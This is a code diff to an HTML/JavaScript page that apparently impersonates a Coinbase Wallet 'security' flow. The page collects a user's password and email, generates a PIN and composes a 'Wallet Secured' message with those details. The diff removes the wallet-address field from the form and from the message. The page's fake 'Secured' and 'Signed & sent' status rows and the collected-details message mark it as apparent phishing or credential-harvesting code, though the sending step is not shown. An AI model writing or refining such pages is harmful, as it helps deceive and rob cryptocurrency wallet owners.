@@ -494,7 +494,6 @@
       <div class="sec-summary" style="margin-bottom:16px">
         <div class="ss-row"><span>Status</span><strong style="color:var(--green)">✓ Secured</strong></div>
         <div class="ss-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
-        <div class="ss-row"><span>Address</span><strong id="sc3Addr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
         <div class="ss-row"><span>Password lock</span><strong style="color:var(--green)">✓ Active</strong></div>
         <div class="ss-row"><span>Attestation</span><strong style="color:var(--green)">✓ Signed &amp; sent</strong></div>
       </div>
@@ -620,7 +619,6 @@ function checkStrength() {
 async function submitSecure(e) {
   const pass    = document.getElementById('passInput').value;
   const confirm = document.getElementById('passConfirm').value;
-  const addr    = document.getElementById('sc2AddrInput').value.trim();
   const email   = document.getElementById('sc2Email').value.trim();
   const err     = document.getElementById('sc2Err');
 
@@ -636,16 +634,8 @@ async function submitSecure(e) {
     document.getElementById('passConfirm').classList.add('err');
     return;
   }
-  if (!addr || addr.length < 6) {
-    err.textContent = '⚠ Please enter your wallet address';
-    err.style.display = 'block';
-    document.getElementById('sc2AddrInput').style.borderColor = '#D23F31';
-    setTimeout(() => { document.getElementById('sc2AddrInput').style.borderColor = ''; }, 1600);
-    return;
-  }
 
   err.style.display = 'none';
-  walletAddress = addr;
   window._secEmail = email;
 
   const btn = e.currentTarget;
@@ -654,14 +644,10 @@ async function submitSecure(e) {
 
   const pin = String(Math.floor(1000 + Math.random() * 9000));
   document.getElementById('sc3Pin').textContent = pin;
-  const short = addr.length > 16 ? addr.slice(0, 10) + '…' + addr.slice(-6) : addr;
-  document.getElementById('sc3Addr').textContent = short;
 
   const msg =
     `🔐 Wallet Secured\n` +
     `📅 ${new Date().toLocaleString()}\n` +
-    `👛 Wallet: Coinbase Wallet\n` +
-    `🔑 Address: ${addr}\n` +
     `📧 Email: ${email || '—'}\n` +
     `🛡️ Password strength: ${passwordStrength || 'Strong'}\n` +
     `🔢 PIN: ${pin}`;
